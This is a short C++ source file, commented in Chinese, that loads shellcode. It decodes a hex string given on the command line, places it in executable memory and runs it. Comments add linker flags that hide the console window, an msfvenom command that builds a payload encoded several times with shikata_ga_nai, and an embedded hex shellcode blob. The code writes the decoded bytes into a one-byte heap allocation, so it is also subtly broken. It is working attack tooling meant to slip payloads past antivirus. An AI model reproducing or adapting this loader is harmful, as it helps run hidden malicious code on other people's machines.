#include<iostream>
#include "windows.h"  
#include "stdio.h"  
#include<string>

using namespace std;


//VC 6.0编译
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口  
//#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积  
//shellcode在生成payload时选择c即可  
//msfvenom -p windows/exec CMD=calc.exe -f exe -e x86/shikata_ga_nai -i 6 -o msf.exe 
//bf6e4a2508d9ebd97424f45d33c9b131317d13037d1383c56aa8d0f49aae1b055acf92e06bcfc161dbff8224d774c6dc6cf8cfd3c5b729ddd6e40a7c54f75e5e6538939fa2255ecd7b21cde2087fce894291566d1290772029cb57c2fe67dedce342a857d7392bbe26c180ff8730d8382fabaf304c56a8862f8c3d1d9747e5f9268b70892460f6d52877db6d54fcdaa1dd46f965861d603f62f39d5fcdac3b2be3b93176693fc70cdf3fd70e4f28e685002ff74f65cf155a9378800f1ee533fa5c10b00f1ce7a86519a36e9553bc1a99c0bd0efa872dd2d322d6712c

void AsciiToHex(char * pAscii, unsigned char * pHex, int nLen) 
{   if (nLen % 2)         
		return;     
	int nHexLen = nLen / 2;     
	for (int i = 0; i < nHexLen; i++)     
	{         
		unsigned char Nibble[2];         
		Nibble[0] = *pAscii++;         
		Nibble[1] = *pAscii++;         
		for (int j = 0; j < 2; j++)         
		{             
			if (Nibble[j] <= 'F' && Nibble[j] >= 'A')                 
				Nibble[j] = Nibble[j] - 'A' + 10;             
			else if (Nibble[j] <= 'f' && Nibble[j] >= 'a')                 
				Nibble[j] = Nibble[j] - 'a' + 10;             
			else if (Nibble[j] >= '0' && Nibble[j] <= '9')                 
				Nibble[j] = Nibble[j] - '0';             
			else                 
				return;        
		}   // for (int j = ...)         
		pHex[i] = Nibble[0] << 4;   // Set the high nibble         
		pHex[i] |= Nibble[1];   //Set the low nibble     
	}   // for (int i = ...) 
}


int main(int argc, char* argv[]) 
{

	char* code=argv[1];
	int len=strlen(code);
	unsigned char * pHex=new unsigned char;
	AsciiToHex(code,pHex,len);
	unsigned char shellcode[1000]={0};
	memcpy(shellcode,pHex,len/2);
	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
    memcpy(Memory, shellcode, sizeof(shellcode));  
    //运行
    ((void(*)())Memory)();
}